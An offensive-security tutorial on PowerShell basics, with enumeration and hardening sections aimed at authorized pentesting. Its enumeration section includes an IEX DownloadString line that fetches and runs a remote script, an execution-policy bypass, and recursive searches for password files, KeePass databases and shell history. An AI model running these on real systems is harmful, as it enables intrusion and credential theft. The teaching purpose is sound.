# PowerShell

> Zero2Root | Basics Series | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **Curriculum ID:** `LC-003` | **Phase 0:** Foundations
> **Est. study:** 4-5h | **Level:** Beginner
> **Prerequisites:** LC-001
> **Book map:** Gray Hat Hacking (Windows post-exploitation chapters)
<!-- LC-CURRICULUM-END -->

## Table of Contents

1. What PowerShell is
2. Navigating directories
3. File & folder management
4. System information
5. Network commands
6. Users & processes
7. The pipeline & objects
8. Authorized host enumeration
9. Security notes: constrained language mode & logging
10. Quick reference cheatsheet

---

## Key Terms

You'll see these words throughout the lesson.

| Term | Plain meaning |
|:---|:---|
| Shell | A program that runs typed commands, like PowerShell or CMD |
| Cmdlet | A PowerShell command, always named `Verb-Noun` (e.g. `Get-Process`) |
| Object | PowerShell's output isn't plain text; it's data with named fields you can use |
| Pipeline (`\|`) | Feeding one command's output straight into the next command |
| Alias | A short nickname for a cmdlet (`ls`, `dir` both mean `Get-ChildItem`) |
| Remoting | Running PowerShell commands on another machine over the network |
| Living off the land | Attackers abusing built-in, trusted tools (like PowerShell) instead of their own malware |
| Constrained Language Mode | A lock-down mode that limits what scripts are allowed to do |

---

## 1. Overview: What is PowerShell

PowerShell is Microsoft's command-line shell and scripting language, built on .NET. Unlike CMD, which works with plain text, PowerShell works with objects: every output is a full .NET object with properties and methods, not just text.

From a cybersecurity perspective, PowerShell matters for a few reasons:

- It is the most popular post-exploitation tool on Windows (Empire, PowerSploit, Nishang are common examples).
- It supports remoting, meaning it can execute commands on other machines.
- Attackers use it to bypass antivirus and EDR through "living off the land" techniques, since it ships with Windows and is trusted by default.

```powershell
# Open PowerShell
Win + R → type "powershell" → Enter

# Open as Administrator
Win + X → "Windows PowerShell (Admin)" / "Terminal (Admin)"

# Check PowerShell version
PS C:\> $PSVersionTable

# Get help for a cmdlet
PS C:\> Get-Help Get-Process
PS C:\> Get-Help Get-Process -Examples
PS C:\> Get-Help Get-Process -Full

# Update local help files (requires internet + admin)
PS C:\> Update-Help
```

> Cmdlet naming convention: PowerShell commands follow a `Verb-Noun` pattern (e.g. `Get-Process`, `Set-Location`, `New-Item`), which makes them predictable and discoverable.

---

## 2. Navigation: Directory Navigation

PowerShell supports native cmdlets (`Get-ChildItem`, `Set-Location`) and CMD/Unix-style aliases (`dir`, `cd`, `ls`) side by side, so the transition from either shell is easier.

```powershell
# Show current directory
PS C:\> Get-Location
PS C:\> pwd          # alias

# Change directory
PS C:\> Set-Location C:\Users\alex\Desktop
PS C:\> cd C:\Users\alex\Desktop    # alias

# Go up one level
PS C:\Users\alex\Desktop> cd ..

# List contents of current directory
PS C:\> Get-ChildItem
PS C:\> ls           # alias
PS C:\> dir          # alias

# List including hidden files
PS C:\> Get-ChildItem -Force

# List recursively
PS C:\> Get-ChildItem -Recurse

# List only directories
PS C:\> Get-ChildItem -Directory

# List only files matching a pattern
PS C:\> Get-ChildItem -Filter *.txt -Recurse
```

| Cmdlet | Alias | Function |
|--------|-------|----------|
| `Get-Location` | `pwd`, `gl` | Show current directory |
| `Set-Location` | `cd`, `sl` | Change directory |
| `Get-ChildItem` | `dir`, `ls`, `gci` | List folder contents |
| `Get-ChildItem -Recurse` | — | Recursive listing |
| `Get-ChildItem -Force` | — | Include hidden files |

---

## 3. File & Folder Management

These cmdlets create, copy, move, and delete files and folders, and also read and search their content.

```powershell
# Create a new folder
PS C:\> New-Item -ItemType Directory -Path "newfolder"
PS C:\> mkdir newfolder      # alias

# Create a new empty file
PS C:\> New-Item -ItemType File -Path "file.txt"

# Remove a file or folder
PS C:\> Remove-Item file.txt
PS C:\> rm file.txt          # alias

# Remove a folder AND all its contents
PS C:\> Remove-Item -Path "folder" -Recurse -Force

# Copy a file
PS C:\> Copy-Item file.txt D:\backup\file.txt
PS C:\> cp file.txt D:\backup\        # alias

# Copy a folder recursively
PS C:\> Copy-Item -Path C:\source -Destination D:\dest -Recurse

# Move a file or folder
PS C:\> Move-Item file.txt D:\backup\
PS C:\> mv file.txt D:\backup\        # alias

# Rename a file or folder
PS C:\> Rename-Item oldname.txt newname.txt

# View contents of a text file
PS C:\> Get-Content file.txt
PS C:\> cat file.txt          # alias
PS C:\> type file.txt         # alias

# View only the last N lines (like tail)
PS C:\> Get-Content file.txt -Tail 10

# Search text inside files (like grep/findstr)
PS C:\> Select-String -Path "*.txt" -Pattern "password"
PS C:\> Get-Content file.txt | Select-String "password"

# Find files by name across the filesystem
PS C:\> Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
```

| Cmdlet | Alias | Function |
|--------|-------|----------|
| `New-Item` | `ni`, `mkdir` | Create new file/folder |
| `Remove-Item` | `rm`, `del`, `rmdir` | Delete file/folder |
| `Copy-Item` | `cp`, `copy` | Copy file/folder |
| `Move-Item` | `mv`, `move` | Move file/folder |
| `Rename-Item` | `ren` | Rename |
| `Get-Content` | `cat`, `type`, `gc` | Display file contents |
| `Select-String` | `sls` | Search text (like grep) |

---

## 4. System Information

These cmdlets retrieve system information, hardware details, and environment variables. Many of them rely on the `CIM`/`WMI` namespace.

```powershell
# Show OS info
PS C:\> Get-ComputerInfo

# Show specific OS details
PS C:\> Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture

# Show environment variables
PS C:\> Get-ChildItem Env:
PS C:\> $env:USERNAME
PS C:\> $env:COMPUTERNAME
PS C:\> $env:PATH

# List installed hotfixes/patches
PS C:\> Get-HotFix

# List installed software
PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version

# Show disk drive info
PS C:\> Get-PSDrive
PS C:\> Get-CimInstance Win32_LogicalDisk

# Show BIOS / hardware info
PS C:\> Get-CimInstance Win32_BIOS
PS C:\> Get-CimInstance Win32_ComputerSystem

# Clear the screen
PS C:\> Clear-Host
PS C:\> cls          # alias
```

| Cmdlet | Function |
|--------|----------|
| `Get-ComputerInfo` | Full system information |
| `Get-CimInstance` | Query WMI/CIM (OS, hardware, etc.) |
| `Get-ChildItem Env:` | Show environment variables |
| `Get-HotFix` | List installed hotfixes |
| `Get-PSDrive` | List drives/volumes |
| `Clear-Host` | Clear screen |

> Pentesting note: `Get-HotFix` helps identify missing security patches that may point to exploitable vulnerabilities.

---

## 5. Network Commands

PowerShell provides modern networking cmdlets, while still being able to call legacy tools like `ping` and `ipconfig`.

```powershell
# Show IP configuration (modern cmdlet)
PS C:\> Get-NetIPConfiguration
PS C:\> Get-NetIPAddress

# Legacy equivalent (still works)
PS C:\> ipconfig /all

# Test connectivity to a host
PS C:\> Test-Connection google.com
PS C:\> ping google.com          # legacy alias still works

# Trace the route to a host
PS C:\> Test-NetConnection google.com -TraceRoute

# Test if a specific port is open
PS C:\> Test-NetConnection -ComputerName target.com -Port 443

# Show active network connections
PS C:\> Get-NetTCPConnection

# Show DNS cache
PS C:\> Get-DnsClientCache

# Resolve a domain name (DNS lookup)
PS C:\> Resolve-DnsName google.com

# Flush DNS cache
PS C:\> Clear-DnsClientCache

# Show network adapters
PS C:\> Get-NetAdapter

# Download a file from the web (like curl/wget)
PS C:\> Invoke-WebRequest -Uri http://target.com/file.txt -OutFile file.txt
PS C:\> iwr http://target.com -UseBasicParsing      # alias
```

| Cmdlet | Function |
|--------|----------|
| `Get-NetIPConfiguration` | Modern IP configuration |
| `Test-Connection` | Test connectivity (ping) |
| `Test-NetConnection` | Test a specific port/connection |
| `Get-NetTCPConnection` | Active TCP connections |
| `Resolve-DnsName` | DNS lookup |
| `Invoke-WebRequest` | HTTP request (like curl) |

> Pentesting note: `Invoke-WebRequest` (alias `iwr`) and `Invoke-RestMethod` (`irm`) show up constantly in fileless, in-memory attack chains, downloading and executing payloads directly from memory without touching disk.

---

## 6. Users & Processes

These cmdlets manage user accounts and groups, and monitor running processes.

```powershell
# Show current logged-in user
PS C:\> whoami
PS C:\> $env:USERNAME

# Show current user's groups and privileges
PS C:\> whoami /groups
PS C:\> whoami /priv

# List all local user accounts
PS C:\> Get-LocalUser

# Show details of a specific user
PS C:\> Get-LocalUser -Name "alex"

# Create a new local user
PS C:\> New-LocalUser -Name "alex" -Password (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)

# Add user to local Administrators group
PS C:\> Add-LocalGroupMember -Group "Administrators" -Member "alex"

# List local groups
PS C:\> Get-LocalGroup

# List members of Administrators group
PS C:\> Get-LocalGroupMember -Group "Administrators"

# Delete a user
PS C:\> Remove-LocalUser -Name "alex"

# List running processes
PS C:\> Get-Process
PS C:\> ps          # alias

# Find a specific process
PS C:\> Get-Process | Where-Object {$_.ProcessName -like "*chrome*"}

# Kill a process by name
PS C:\> Stop-Process -Name "notepad" -Force

# Kill a process by PID
PS C:\> Stop-Process -Id 1234 -Force

# Start a new process
PS C:\> Start-Process notepad.exe
```

| Cmdlet | Function |
|--------|----------|
| `Get-LocalUser` | List all local users |
| `New-LocalUser` | Create new user |
| `Add-LocalGroupMember` | Add to group |
| `Get-LocalGroupMember` | Show group members |
| `Get-Process` | List running processes |
| `Stop-Process` | Terminate a process |
| `Start-Process` | Start a new process |

> Important: `New-LocalUser` and `Add-LocalGroupMember` require running PowerShell as Administrator.

---

## 7. Pipeline & Objects

PowerShell's key feature is its object-based pipeline. Output from one cmdlet, a full object with properties, can be piped directly into the next cmdlet without text parsing. This differs from Linux pipes, which pass raw text between commands.

```powershell
# Filter objects with Where-Object
PS C:\> Get-Process | Where-Object {$_.CPU -gt 100}

# Sort objects
PS C:\> Get-Process | Sort-Object CPU -Descending

# Select specific properties only
PS C:\> Get-Process | Select-Object Name, Id, CPU

# Format output as a table
PS C:\> Get-Process | Format-Table -AutoSize

# Format output as a list
PS C:\> Get-Process | Format-List

# Measure / count objects
PS C:\> Get-ChildItem | Measure-Object

# Export results to CSV
PS C:\> Get-Process | Export-Csv processes.csv -NoTypeInformation

# Convert to JSON (useful for scripting/exfil)
PS C:\> Get-Process | Select-Object Name, Id | ConvertTo-Json

# ForEach loop over pipeline objects
PS C:\> Get-ChildItem | ForEach-Object { Write-Host $_.Name }
```

| Cmdlet | Alias | Function |
|--------|-------|----------|
| `Where-Object` | `?`, `where` | Filter objects |
| `Select-Object` | `select` | Select specific properties |
| `Sort-Object` | `sort` | Sort objects |
| `ForEach-Object` | `%`, `foreach` | Loop over each object |
| `Format-Table` | `ft` | Format as table |
| `ConvertTo-Json` | — | Convert to JSON |

---

## 8. Authorized Host Enumeration

On authorized engagements or in your own lab, PowerShell is useful for inventorying hosts and auditing configuration. Use these commands only on systems you have permission to assess.

```powershell
# ── Basic Recon ─────────────────────────────────────
whoami /all                                    # full identity, groups, privileges
$env:USERNAME, $env:COMPUTERNAME               # quick context
Get-ComputerInfo | Select OsName, OsVersion    # OS details

# ── Execution Policy (often needs bypassing) ────────
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process       # temporary, current session only

# ── User & Group Enumeration ────────────────────────
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# ── Network Enumeration ─────────────────────────────
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# ── Files & Credentials Hunting ─────────────────────
Get-ChildItem -Path C:\ -Include *password*,*.kdbx -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"
Get-ChildItem -Path C:\Users -Include *.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String "password"

# ── PowerShell History (often contains credentials) ─
Get-Content (Get-PSReadlineOption).HistorySavePath

# ── Scheduled Tasks & Services (priv-esc vectors) ───
Get-ScheduledTask | Select TaskName, State
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-CimInstance Win32_Service | Select Name, PathName, StartMode

# ── Installed Software & Patches ────────────────────
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Product | Select Name, Version

# ── Download & execute in-memory (fileless technique) ───
IEX (New-Object Net.WebClient).DownloadString('http://target.com/script.ps1')
```

> Note: these commands are meant for authorized penetration testing and CTF environments only. Many EDR/AV solutions flag `IEX`, `DownloadString`, and execution-policy bypasses, so use them with awareness of what they trigger.

---

## 9. Security Note: Admin Hardening, Constrained Language & Logging

Malware abuses PowerShell often enough that admin controls and logging are among the more important Windows defenses.

```powershell
# ── Language mode (defense posture) ─────────────────────────
$ExecutionContext.SessionState.LanguageMode
# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage
# Constrained Language Mode (CLM) blocks most .NET / COM abuse while
# allowing approved cmdlets — pair with AppLocker/WDAC script rules.

# ── Execution policy (necessary but NOT a security boundary) ─
Get-ExecutionPolicy -List
# Prefer: AllSigned / RemoteSigned for admins; enforce via GPO.
# Attackers can bypass process-scoped policy — rely on WDAC + logging.

# ── Script Block Logging / Module Logging / Transcription ────
# Enable via GPO (recommended) under:
# Computer Config → Admin Templates → Windows Components → Windows PowerShell
#  - Turn on PowerShell Script Block Logging
#  - Turn on Module Logging (core modules + *)
#  - Turn on PowerShell Transcription (central share)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20

# ── Just Enough Administration (JEA) ─────────────────────────
# Expose only approved cmdlets/functions to remote admins
Get-PSSessionConfiguration | Format-Table Name, Permission

# ── Least privilege for interactive admins ───────────────────
# Daily work: standard user; elevate only for change windows
whoami /groups | findstr /i "Admin High Mandatory"
```

| Control | Purpose |
|---------|---------|
| Constrained Language Mode | Limits dangerous .NET/COM use |
| WDAC / AppLocker | Allows only signed/approved scripts |
| Script Block Logging | Audits script contents |
| Transcription | Records admin sessions |
| JEA | Minimizes the remote admin surface |
| AMSI + Defender | Detects malicious scripts |

> Defense-first: execution policy alone is not a security boundary. Combine WDAC/AppLocker, CLM, Script Block Logging, and JEA, and monitor Event ID 4104/4103 for anomalous admin activity.

---

## 10. Command Summary Table

| Cmdlet | Function | Admin needed? |
|--------|----------|----------------|
| `Get-ChildItem` | List folder contents | No |
| `Set-Location` | Change directory | No |
| `New-Item` / `Remove-Item` | Create/remove file or folder | No (system files: yes) |
| `Copy-Item` / `Move-Item` | Copy/move file | No |
| `Get-Content` | Display file contents | No |
| `Get-ComputerInfo` | System info | No |
| `Get-NetIPConfiguration` | Network configuration | No |
| `Test-Connection` | Network test (ping) | No |
| `Get-NetTCPConnection` | Active connections | No |
| `whoami /all` | Full user identity | No |
| `New-LocalUser` | Create user | Yes |
| `Add-LocalGroupMember` | Manage groups | Yes |
| `Get-Process` / `Stop-Process` | Manage processes | No (some processes: yes) |
| `Get-ScheduledTask` | Scheduled tasks | No |
| `Invoke-WebRequest` | HTTP request | No |

---

## Practical Workflow Example

```powershell
# ── SCENARIO: Quick Windows host enumeration ─────────

# 1. Identify who and where you are
whoami /all
Get-ComputerInfo | Select-Object OsName, OsVersion, OsArchitecture

# 2. Check network setup
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# 3. Enumerate users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# 4. Look for interesting files
Get-ChildItem -Path C:\Users -Include *password*,*.config -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"

# 5. Check scheduled tasks and services for priv-esc
Get-ScheduledTask | Select-Object TaskName, State
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode

# 6. Check running processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

---

## Quick Reference Cheatsheet

```powershell
# ── NAVIGATION ──────────────────────────────────────────────
Set-Location <path>            # cd        — change directory
Get-Location                   # pwd       — show current directory
Get-ChildItem                  # dir, ls   — list contents
Get-ChildItem -Recurse         #           — list recursively

# ── FILE / FOLDER ───────────────────────────────────────────
New-Item -ItemType Directory <name>    # mkdir   — create folder
Remove-Item -Recurse -Force <name>     # rm /s   — delete folder + contents
Copy-Item <src> <dest>                 # cp      — copy file
Move-Item <src> <dest>                 # mv      — move file/folder
Get-Content <file>                     # cat     — view file contents
Select-String -Path <file> -Pattern "<text>"   # grep — search inside file

# ── SYSTEM INFO ─────────────────────────────────────────────
Get-ComputerInfo               # full system info
Get-CimInstance Win32_OperatingSystem   # OS details
Get-HotFix                     # installed patches
Get-ChildItem Env:              # environment variables
Clear-Host                     # cls — clear screen

# ── NETWORK ──────────────────────────────────────────────────
Get-NetIPConfiguration         # IP config
Test-Connection <host>         # ping
Test-NetConnection <host> -Port <port>   # check specific port
Get-NetTCPConnection           # active connections
Resolve-DnsName <domain>       # DNS lookup
Invoke-WebRequest -Uri <url> -OutFile <file>   # download (curl-like)

# ── USERS / PROCESSES ───────────────────────────────────────
whoami /all                    # current user, groups, privileges
Get-LocalUser                  # list local users
New-LocalUser -Name <name> -Password <securestring>
Add-LocalGroupMember -Group "Administrators" -Member <name>
Get-Process                    # list running processes
Stop-Process -Name <name> -Force   # kill process by name

# ── PIPELINE / OBJECTS ───────────────────────────────────────
Get-Process | Where-Object {$_.CPU -gt 100}    # filter
Get-Process | Sort-Object CPU -Descending      # sort
Get-Process | Select-Object Name, Id           # select fields
Get-Process | Format-Table -AutoSize           # format as table
Get-Process | ConvertTo-Json                   # convert to JSON

# ── DEFENSE / HARDENING CHECKS ──────────────────────────────
$ExecutionContext.SessionState.LanguageMode   # expect ConstrainedLanguage where enforced
Get-ExecutionPolicy -List                     # policy inventory (not a boundary alone)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
Get-PSSessionConfiguration | Format-Table Name, Permission
```

---

> References & Book Sources:
> - Peter Kim — *The Hacker Playbook 3* (`~/Documents/Books/CyberSec/Ethical Hacking/`) — authorized methodology context
> - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - Allen Harper et al. — *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
> - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview) · Script Block Logging · JEA · Constrained Language Mode
> - `Get-Help <cmdlet> -Full`

> Zero2Root | Basics Series | kodoktheGr3at | 2026
> Repository: [Zero2Root](https://github.com/Kodokthegr3at/Zero2Root)
> Feedback & contributions welcome. Open an issue or PR if you spot any errors.
